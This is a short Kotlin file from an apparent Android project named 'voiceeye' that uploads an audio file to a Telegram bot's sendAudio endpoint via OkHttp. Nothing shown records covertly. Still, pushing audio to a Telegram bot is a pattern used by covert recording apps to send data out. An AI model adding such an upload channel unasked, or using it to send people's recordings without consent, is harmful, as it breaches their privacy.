package com.example.voiceeye

import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import java.io.File

object TelegramUploader {
    private val client = OkHttpClient()

    fun uploadAudio(botToken: String, chatId: String, file: File): Boolean {
        return try {
            val url = "https://api.telegram.org/bot$botToken/sendAudio"
            val mediaType = "audio/mp4".toMediaTypeOrNull()
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name, RequestBody.create(mediaType, file))
                .build()

            val req = Request.Builder().url(url).post(body).build()
            val resp = client.newCall(req).execute()
            resp.use { it.isSuccessful }
        } catch (t: Throwable) {
            t.printStackTrace()
            false
        }
    }
}
